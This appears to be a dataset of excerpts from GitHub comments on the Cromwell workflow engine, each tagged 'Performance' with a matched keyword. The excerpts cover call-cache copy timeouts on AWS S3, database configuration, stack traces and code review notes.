Performance," INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Starting drs_usa_jdr.read_drs_with_usa, drs_usa_jdr.localize_jdr_drs_with_usa, drs_usa_jdr.skip_localize_jdr_drs_with_usa; 2020-10-13 18:57:58,653 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.skip_localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,654 cromwell-system-akka.dispatchers.backend-dispatcher-81 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.backend-dispatcher-63 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,747 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,881 cromwell-system-akka.dispatchers.backend-dispatcher-83 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:58:01,299 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:1663,cache,cache,1663,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335,1,['cache'],['cache']
Performance," On Sun, Oct 25, 2020 at 8:37 PM Luyu <notifications@github.com> wrote:. > Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if; > there is a few minutes gap between workflows the instances will be; > terminated by batch and the disks will be reclaimed so each workflow starts; > from scratch. However in your case there isn’t a pause in work long enough; > for Batch to shut down the instances. Also because these files are written; > to a mounted disk they are not deleted when the container terminates. I; > think this fix is simple if I add a cleanup step. I will do this ASAP.; > Thanks, Mark; > … <#m_-3989886626109986556_>; > On Sat, Oct 24, 2020 at 5:27 AM Luyu *@*.***> wrote: Hi, I have set up a; > Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space. I have checked Cromwell documents; > and some materials from AWS, as well as issue #4323; > <https://github.com/broadinstitute/cromwell/issues/4323> <#4323; > <https://github.com/broadinstitute/cromwell/issues/4323>>. But none of; > them works for me. Thank you in advance for any suggestions. — You are; > receiving this because you are subscribed to this thread. Reply to this; > email directly, view it on GitHub <#5974; > <https://github.com/broadinstitute/cromwell/issues/5974>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA; > .; >; > Hi Mark,; >; > Thanks for your reply.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718299843:1104,concurren,concurrently,1104,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-718299843,1,['concurren'],['concurrently']
Performance," RejectedExecutionException: ); > 2020-11-07 17:54:51,635 cromwell-system-akka.dispatchers.engine-dispatcher-35 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Invalidating cache entry CallCachingEntryId(347) (Cache entry details: Some(7b292def-1477-4450-988a-e01627d61786:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0)); > 2020-11-07 17:54:51,673 cromwell-system-akka.dispatchers.backend-dispatcher-7385 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-BackendCacheHitCopyingActor-0123c178:GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:-1:1-5 [UUID(0123c178)GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Ge",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:1480,cache,cache,1480,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,1,['cache'],['cache']
Performance, Unable to create actor for ActorRef Actor[akka://; cromwell-system/user/SingleWorkflowRunnerActor/ServiceRegistryActor/KeyValue#988818050]; java.lang.RuntimeException: Unable to create actor for ActorRef Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/ServiceRegistryActor/KeyValue#988818050]; at cromwell.server.CromwellRootActor$$anonfun$1.applyOrElse(CromwellRootActor.scala:81); at cromwell.server.CromwellRootActor$$anonfun$1.applyOrElse(CromwellRootActor.scala:80); at akka.actor.SupervisorStrategy.handleFailure(FaultHandling.scala:295); at akka.actor.dungeon.FaultHandling$class.handleFailure(FaultHandling.scala:263); at akka.actor.ActorCell.handleFailure(ActorCell.scala:374); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:459); at akka.actor.ActorCell.systemInvoke(ActorCell.scala:483); at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:282); at akka.dispatch.Mailbox.run(Mailbox.scala:223); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.reflect.InvocationTargetException; at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method); at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62); at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45); at java.lang.reflect.Constructor.newInstance(Constructor.java:423); at akka.util.Reflect$.instantiate(Reflect.scala:65); at akka.actor.ArgsReflectConstructor.produce(IndirectActorProducer.scala:96); at akka.actor.Props.newActor(Props.scala:213); at akka.actor.ActorCell.newActor(ActorCell.scala:562); at akka.actor.ActorCell.create(ActorCell.scala:588); at akka.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1748#issuecomment-265155974:1175,concurren,concurrent,1175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1748#issuecomment-265155974,1,['concurren'],['concurrent']
Performance, by: java.lang.RuntimeException: Class cromwell.services.womtool.impl.WomtoolServiceInCromwellActor for service Womtool cannot be found in the class path.; 	at cromwell.services.ServiceRegistryActor$.serviceProps(ServiceRegistryActor.scala:54); 	at cromwell.services.ServiceRegistryActor$.$anonfun$serviceNameToPropsMap$2(ServiceRegistryActor.scala:37); 	at scala.collection.TraversableLike.$anonfun$map$1(TraversableLike.scala:234); 	at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:231); 	at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:462); 	at scala.collection.TraversableLike.map(TraversableLike.scala:234); 	at scala.collection.TraversableLike.map$(TraversableLike.scala:227); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:36); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCell.newActor(ActorCell.scala:624); 	at akka.actor.ActorCell.create(ActorCell.scala:650); 	... 9 common frames omitted; Caused by: java.lang.ClassNotFoundException: cromwell.services.womtool.impl.WomtoolServiceInCromwellActor; 	at java.net.URLClassLoader.findClass(URLClassLoader.java:381); 	at java.lang.ClassLoader.loadClass(ClassLoader.java:424); 	at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:331); 	at java.lang.ClassLoader.loadClass(ClassLoader.java:357); 	at java.lang.Class.forName0(Native Method); 	at java.lang.Class.forName(Class.java:264); 	at cromwell.services.ServiceRegistryActor$.serviceProps(ServiceRegistryActor.scala:51); 	... 24 common frames omitted; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:5144,load,loadClass,5144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,3,['load'],['loadClass']
Performance," copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to thi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:1017,cache,cache,1017,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491,1,['cache'],['cache']
Performance," files can be multiple GBs). Here is our database setup:; ```; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; # See http://hsqldb.org/doc/2.0/guide/dbproperties-chapt.html; # Shutdown=false. Cromwell will shutdown the database; # hsqlldb.default_table_type=cached. By default hsqldb uses in memory tables. ; # Setting this to cache for improved memory usage.; # hsqldb.result_max_memory_rows=10000 . Limits the amount of rows in memory for temp tables; # hsqldb.tx=mvcc cromwell default. Not changing it. Not clear what this does. http://hsqldb.org/doc/guide/sessions-chapt.html#snc_tx_mvcc; # hsqldb.large_data=true. Cromwell creates huge DBs that need to be opened.; # hsqldb.applog=1. Log errors.; # hsqldb.lob_compressed=true. Compress lobs. This saves a lot of space.; # hsqldb.script_format=3. Compress script. (uses gzip internally).; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3; """"""; # Override the cromwell default of only 3 seconds (3000 milliseconds) and allow for 300s to read the database file.; connectionTimeout = 300000; numThreads = 1; }; }; ```; Please note the `connectionTimeout = 300000` where we set the connection timeout to 5 minutes. This works for most cases. On a side note: HSQLDB has got to be the worst performing embedded database designed in the history of mankind. When running a decent-sized WDL workflow it can get 30 GB in memory! When using the file-based database it still needs 2 GB in memory (on top of the 1 GB that cromwell needs) is very slow, and creates a multiple GB file database. (EDIT: I checked my multiple run 100 sample RNA-seq pipeline that has run multiple times, using call-caching and sometimes with slightly different settings: **85 GB** in files for the database.); MyS",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-624458757:1134,cache,cached,1134,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-624458757,1,['cache'],['cached']
Performance," improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadinstitute/cromwell/issues/5977>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ; > .; >; > —; > You are receiving this because you commented.; >; >; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491>,; > or unsubscribe; > <https://github.com/notifica",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:2102,Cache,Cache,2102,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['Cache'],['Cache']
Performance," java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Hikari Housekeeping Timer (pool db)"" #35 daemon prio=5 os_prio=0 tid=0x00007fdaf8212800 nid=0xa0b waiting on condition [0x00007fdb80cd2000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b74b1f0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Abandoned connection cleanup thread"" #34 daemon prio=5 os_prio=0 tid=0x00007fdaf81fc000 nid=0xa0a in Object.wait() [0x00007fdb80fd3000]; java.lang.Thread.State: TIMED_WAITING (on object monitor); at java.lang.Object.wait(Native Method); at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143); - locked <0x000000015b76b538> (a java.lang.ref.ReferenceQueue$Lock); at com.mysql.jdbc.AbandonedConnectionCleanupThread.run(AbandonedConnectionCleanupThread.java:43). ""Service Thread"" #17 daemon prio=9 os_prio=0 tid=0x00007fdbcc2d4000 nid=0x9f9 runnable [0x0000000000000000]; java.lang.Thread.State: RUNNABLE. ""C1 CompilerThread11"" #16 daemon prio=9 os_prio=0 tid=0x00007fdbcc2d1000 nid=0x9f8 waiting on condition [0x0000000",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:5507,concurren,concurrent,5507,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance," look at this issue of disappearing SGE jobs in depth for at least a couple weeks. For now, here's a brain dump of notes. After a short bit of review, I'd perhaps try a different approach.; - On execute or recover, `scheduleOnce` a message back to `self` to later check if a job is alive.; - When the message is received check if the job is alive.; - If the job is alive `scheduleOnce` a message to check if the job is alive again.; - If the job is not alive write an rc file with `143` (or other code, see notes on configuration below).; - An instance of `cromwell.core.retry.Backoff` should travel inside the scheduled messages. Each time the message is to be scheduled, get the next time. As for the existing code, here are a few notes.; - Use `java.time` instead of `java.util`. `java.time.Instant` and `java.time.Duration` may be used to calculate the amount of time between two instants.; - `IsAliveCash.cash` should be `.cache`.; - `.map(_.cache).getOrElse(true)` should be `.forall(_.cache)`, however...; - `.cache` always appears to be `true`, and thus not needed.; - `!isAliveCache.contains` followed by `isAliveCache.get` should be `isAliveCache.getOrElseUpdate(job, IsAliveCache(Instant.now))`.; - There should be only one `SharedFileSystemJob` per `SharedFileSystemAsyncJobExecutionActor`. The reason the values are passed around is because the actor is also partially stateless, using `context.become` to track the `SharedFileSystemJob`. This PR adds state more to the actor, outside of the context, but that shouldn't be needed if the `isAlive` check is switched to running due to multiple `scheduleOnce` calls. The tests are likely timing out because the of the extra checks to `isAlive`. The tests are meant to run as quickly as possible. In general, the order of the job completion checking should always be 1) multiple rc file polls, 2) 30 seconds later `isAlive` checks as necessary. This individual polling per job may overwhelm the SGE scheduler if hundreds or thousands of scatt",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243562238:1304,cache,cache,1304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243562238,1,['cache'],['cache']
Performance," of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadinstitute/cromwell/issues/5977>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFS",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1947,cache,cache,1947,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['cache'],['cache']
Performance," of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specific use case where we are on a hpc cluster, with a slow NFS-based filesystem, with file-based databases limited to single projects, the metadata is not very interesting. Using the following configuration works very well initially:. ```HOCON; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text&journal_mode=truncate""; numThreads=1; }; metadata {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite::memory:?foreign_keys=true&date_class=text""; numThreads=1; }; }; }; ```; This limits the amount of IO operations to the bare minimum to get call-caching working. With this configuration cromwell was able to rerun the callcached 1000+ job workflow in ~25 minutes. However it c",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:1846,perform,perform,1846,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906,1,['perform'],['perform']
Performance, recursion (from SBT logs):; ```; [0m[[0m[31merror[0m] [0m[0mjava.lang.StackOverflowError[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:64)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:211)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:145)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.Tuple2.hashCode(Tuple2.scala:19)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.runtime.Statics.anyHash(Statics.java:115)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap$MangledHashing.hash(TrieMap.scala:984)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap.computeHash(TrieMap.scala:829)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap.get(TrieMap.scala:844)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.MapLike.contains(MapLike.scala:150)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.MapLike.contains$(MapLike.scala:150)[0m; [0m[[0m[31merror[0m] [0m[0m	at scala.collection.concurrent.TrieMap.contains(TrieMap.scala:631)[0m; [0m[[0m[31merror[0m] [0m[0m	at scoverage.Invoker$.invoked(Invoker.scala:34)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:44)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:48)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:48)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:48)[0m; [0m[[0m[31merror[0m] [0m[0m	at cloud.nio.impl.drs.DrsCloudNioFileSystemProvider.getHost(DrsCloudNioFileSystemProvider.scala:48)[0m; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4903#issuecomment-487021855:1204,concurren,concurrent,1204,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4903#issuecomment-487021855,1,['concurren'],['concurrent']
Performance, scala.collection.mutable.ArrayBuffer.foreach(ArrayBuffer.scala:48) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$class.cromwell$engine$backend$Backend$$hashGivenDockerHash(Backend.scala:193) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at scala.util.Success.map(Try.scala:237) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at 